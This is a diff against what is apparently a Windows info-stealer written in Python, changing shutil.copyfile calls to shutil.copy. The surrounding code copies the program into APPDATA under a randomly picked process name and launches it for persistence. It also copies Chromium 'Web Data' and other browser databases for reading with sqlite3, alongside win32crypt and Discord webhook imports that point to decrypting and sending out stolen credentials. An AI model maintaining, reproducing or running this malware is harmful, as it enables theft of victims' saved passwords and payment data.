@@ -1,7 +1,6 @@
 import os
 from datetime import datetime, timedelta
 from os import getenv, getlogin, listdir
-from shutil import copyfile
 import sqlite3
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import win32crypt
@@ -133,7 +132,7 @@ if yes == "yes":
 				os.mkdir(str(os.getenv('APPDATA')) +"\\" +folderName)
 				rdmchoice = random.choice(PROCCESS_NAMES) 
 				target = str(os.getenv('APPDATA')) + "\\" + folderName + "\\" + rdmchoice+ ".exe"
-				shutil.copyfile(original, target)
+				shutil.copy(original, target)
 				threading.Thread(launchProcesses(str(os.getenv('APPDATA')) + "\\" + folderName + "\\" + rdmchoice+ ".exe")).start()
 		else:
 			print("[.] Already duplicated.")
@@ -193,7 +192,7 @@ if yes == "yes":
 					if not os.path.exists(chromiumpaths[i]):
 						continue
 					path = str(chromiumpaths[i] + "\\Web Data")
-					shutil.copyfile(path, "webdata.db")
+					shutil.copy(path, "webdata.db")
 					path = "webdata.db"
 					db = sqlite3.connect(path)
 					connection = sqlite3.connect(str(path))
@@ -290,7 +289,7 @@ if yes == "yes":
 				
 				filename =  str(uuid.uuid4()) + ".db"
 				if not os.path.isfile(filename):
-					shutil.copyfile(db_path, filename)
+					shutil.copy(db_path, filename)
 				# connect to the database
 				db = sqlite3.connect(filename)
 				# ignore decoding errors
